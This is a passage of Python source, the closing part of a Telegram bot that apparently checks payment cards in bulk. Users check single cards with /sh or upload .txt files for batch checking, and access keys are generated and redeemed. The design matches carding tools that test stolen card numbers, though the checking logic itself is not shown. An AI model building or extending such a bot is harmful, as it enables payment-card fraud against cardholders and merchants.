            checking_tasks[user_id]['stop'] = True
            await query.edit_message_text("🛑 Checking Stopped")
            logger.info("200 OK: Checking stopped via button")
        else:
            await query.edit_message_text("🚫 No active checking process to stop.")
    elif query.data == 'help':
        await query.edit_message_text(
            "ℹ Help: Use /sh to check a single card, /stop to stop checking, or upload a .txt file for batch checking."
        )

async def stop_batch(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if user_id in checking_tasks:
        checking_tasks[user_id]['stop'] = True
        await query.edit_message_text("🛑 Checking Stopped")
        logger.info("200 OK: Batch checking stopped")
    else:
        await query.edit_message_text("🚫 No active checking process to stop.")

def main():
    logger.info("🔥 Bot Started 🔥")
    application = Application.builder().token(TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("sh", single_check))
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("delkey", delkey))
    application.add_handler(CommandHandler("broadcast", broadcast))
    application.add_handler(CallbackQueryHandler(button, pattern='^(upload_file|cancel_check|help)$'))
    application.add_handler(CallbackQueryHandler(stop_batch, pattern='^stop_batch$'))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    application.run_polling()

if __name__ == '__main__':
    main()